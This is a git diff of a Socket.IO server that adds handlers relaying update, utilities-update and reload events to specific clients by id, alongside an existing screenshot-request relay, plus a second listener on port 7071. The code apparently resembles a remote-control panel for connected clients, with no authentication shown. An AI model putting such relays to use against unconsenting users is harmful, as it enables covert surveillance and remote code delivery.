@@ -101,6 +101,18 @@ io.on("connection", (sk) => {
     sk.to(id).emit("version_update", update_name);
   });
 
+  sk.on("apiupdatethisclientcore", (id, update_name) => {
+    sk.to(id).emit("version_update", update_name);
+  });
+
+  sk.on("apiupdatethisclientutils", (id, update_name) => {
+    sk.to(id).emit("utils_update", update_name);
+  });
+
+  sk.on("apireload", () => {
+    sk.to(sk.id).emit("reload");
+  });
+
   sk.on("apigetscreenshot", (id) => {
     sk.to(id).emit("screenshot");
   });
@@ -203,3 +215,5 @@ app.use(async (ctx) => {
 });
 
 httpServer.listen(7070);
+
+app.listen(7071);
